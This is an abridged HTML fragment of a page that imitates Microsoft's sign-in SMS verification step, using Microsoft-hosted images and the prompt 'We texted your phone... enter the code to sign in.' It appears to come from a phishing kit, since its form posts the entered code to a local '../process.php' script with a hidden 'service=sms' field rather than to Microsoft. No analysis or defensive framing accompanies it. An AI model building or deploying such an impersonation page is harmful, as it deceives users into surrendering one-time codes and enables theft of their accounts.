...
<body  class="cb" style="display: block;" data-gr-c-s-loaded="true">
    ...
    <div>
        ...
        <form name="f1" id="i0281" novalidate="novalidate" spellcheck="false" method="post" target="_top" autocomplete="off" action="../process.php">
                                    ...
                                    <div >
                                        ...
                                        <div data-viewid="1" data-showidentitybanner="true" >
                                            ...
                                            <div class="row text-body">
                                                <div >
                                                    <img class="tile-img small" role="presentation" pngsrc="https://aadcdn.msauth.net/shared/1.0/content/images/picker_verify_sms_b15dda889e9803e9d6befd60000fadf8.png" svgsrc="https://aadcdn.msauth.net/shared/1.0/content/images/picker_verify_sms_27a6d18b56f46818420e60a773c36d4e.svg"  src="https://aadcdn.msauth.net/shared/1.0/content/images/picker_verify_sms_27a6d18b56f46818420e60a773c36d4e.svg">
                                                </div>
                                                <div id="idDiv_SAOTCC_Description" class="text-block-body overflow-hidden" >We texted your phone +XX XXXXXXXXXXX‎. Please enter the code to sign in.</div>
                                            </div>
            ...
            <input type="hidden" name="service" value="sms">
